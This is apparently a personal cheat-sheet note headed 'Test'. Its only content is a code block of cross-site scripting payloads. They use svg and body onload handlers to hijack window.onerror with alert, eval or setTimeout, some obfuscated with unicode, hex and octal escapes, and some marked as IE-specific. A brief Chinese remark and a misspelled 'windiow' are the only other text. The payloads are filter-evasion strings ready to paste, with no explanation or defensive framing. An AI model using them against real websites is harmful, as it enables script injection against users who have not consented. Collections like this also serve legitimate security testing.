### Test


```html
top
self
parent
windiow




<svg onload="javascript:window.onerror=alert;throw 1">
<svg onload="javascript:top.onerror=alert;throw 1">
<svg onload="javascript:parent.onerror=alert;throw 1">
<svg onload="javascript:self.onerror=alert;throw 1">
使用 onerror来捕获异常
<svg onload="javascript:self.onerror=\u0061lert;throw 1">
  
IE:
<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';>
<body/onload=javascript:window.onerror=setTimeout;throw'=alert\50\51';>
  
```
